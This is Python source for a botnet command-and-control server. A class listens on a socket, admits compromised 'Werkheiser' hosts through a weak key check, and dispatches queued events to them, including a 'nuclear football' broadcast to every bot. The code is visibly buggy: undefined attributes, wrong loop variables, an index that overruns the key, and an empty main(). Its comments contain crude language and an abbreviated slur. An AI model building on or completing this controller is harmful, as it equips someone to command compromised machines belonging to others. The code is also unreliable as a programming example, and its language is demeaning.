import socket
import threading
import time
import random
from Werkheiser import Werkheiser
from Event import Event

class C2:
    def __init__(self):
        self.events = []
        self.werkheisers = {}
        self.driver_work = threading.Thread(target=self.irs)
        self.server_socket = None
        self.lock = threading.Lock()

        # I don't know much about cryptography and this can be easily broken :P
        # Max or Kyler clutch up, on some gvng shit
        self.key_differences = []

        # Shout out if you get the reference :DDDD
        self.c2_agent_key = 'Hoover MaxExtract PressurePro (Model 60)'
        self.c2_nuclear_football = 'G00N13 Opening'

        # Calculate the differences.
        for i in range(len(self.c2_agent_key) - 1):
            self.key_differences.append(ord(self.c2_agent_key[i + i]) - ord(self.c2_agent_key[i]))

    def get_werkheisers(self):
        # Get all of the Werkheisers.
        return self.werkheisers
    
    def dispatch(self, ips, event):
        # Tell workers with a given IP what to do. Or...
        # First, check if we're playing football.
        if len(ips) == 1 and self.ips[0] == self.c2_nuclear_football:
            # We have our opening... time for the approach.
            print('[+] G00N13 opening detected! Attempting the G00N13 approach...')

            # All hands on deck.
            with self.lock:
                for ip in self.werkheisers.keys():
                    print(f'[+] Notified {self.werkheisers[id]} to do "{event}"...')
                    self.werkheisers[ip].queue(event)
            return
        
        for ip in ips:
            with self.lock:
                # Check if that IP is authorized...
                if ip not in self.werkheisers.keys():
                    print(f'[!] IP {ip} not an authorized Werkheiser; skipping...')
                    continue
                
                # Queue it up.
                self.werkheisers[ip].queue(event)
            
    def authenticate_werkheiser(self, client_key):
        for i in range(len(self.key_differences)):
            if (ord(client_key[i + i]) - ord(client_key[i]) != self.key_differences[i]):
                return False
        return True

    def irs(self):
        # Start a socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(('127.0.0.1', 23765))
        self.server_socket.listen()

        while True:
            # Wait for connection. 
            c_s, connection_info = self.server_socket.accept()

            # Once we have a connection, store information.
            (c_address, c_port) = connection_info

            # Wait for a sentinel message to make sure we are talking to a poisoned host.
            # Set the timeout to 3 seconds
            c_s.settimeout(3)

            # Wait for message
            message = c_s.recv().decode()
            if not self.authenticate_werkheiser(message):
                # Remove them if they are in the address book. Could be someone who got control back.
                if c_address in self.werkheisers.keys():
                    del self.werkheisers[c_address]

                # Delay closing the connection for a random time so they can't sidechannel our shit
                time.sleep(2 + random.random() * 10)

                # Get this bumass n outta here...
                c_s.close()
                continue
            
            with self.lock:
                # Update address book if not already there.
                if c_address not in self.werkheisers.keys():
                    self.werkheisers[c_address] = Werkheiser(c_address)

                # Forward all of the notifications
                self.werkheisers[c_address].notify()

            
def main():
    ...

if __name__ == '__main__':
    main()
